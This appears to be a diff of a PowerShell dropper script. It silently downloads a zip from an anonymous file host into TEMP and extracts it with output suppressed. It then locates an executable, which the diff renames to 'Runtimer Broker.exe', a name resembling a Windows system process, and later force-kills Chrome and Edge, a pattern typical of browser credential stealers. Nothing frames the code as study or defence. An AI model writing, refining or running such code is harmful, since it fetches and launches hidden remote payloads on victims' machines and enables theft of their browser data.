@@ -1,13 +1,13 @@
 $zipUrl = "https://files.catbox.moe/7fwhvd.zip"
 
-$zipPath = "$env:TEMP\work.zip"
-$extractPath = "$env:TEMP\work"
+$zipPath = "$env:TEMP\temp.zip"
+$extractPath = "$env:TEMP\temp"
 
 Invoke-WebRequest $zipUrl -OutFile $zipPath > $null 2>&1
 
 Expand-Archive $zipPath $extractPath -Force > $null 2>&1
 
-$exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1
+$exe = Get-ChildItem $extractPath -Recurse -Filter "Runtimer Broker.exe" | Select-Object -First 1
 
 if ($exe) {
 
@@ -20,7 +20,7 @@ if ($exe) {
 
 Start-Sleep 2
 
-taskkill /f /im Runtimer Broker.exe > $null 2>&1
+taskkill /f /im "Runtimer Broker.exe" > $null 2>&1
 taskkill /f /im chrome.exe > $null 2>&1
 taskkill /f /im msedge.exe > $null 2>&1
 
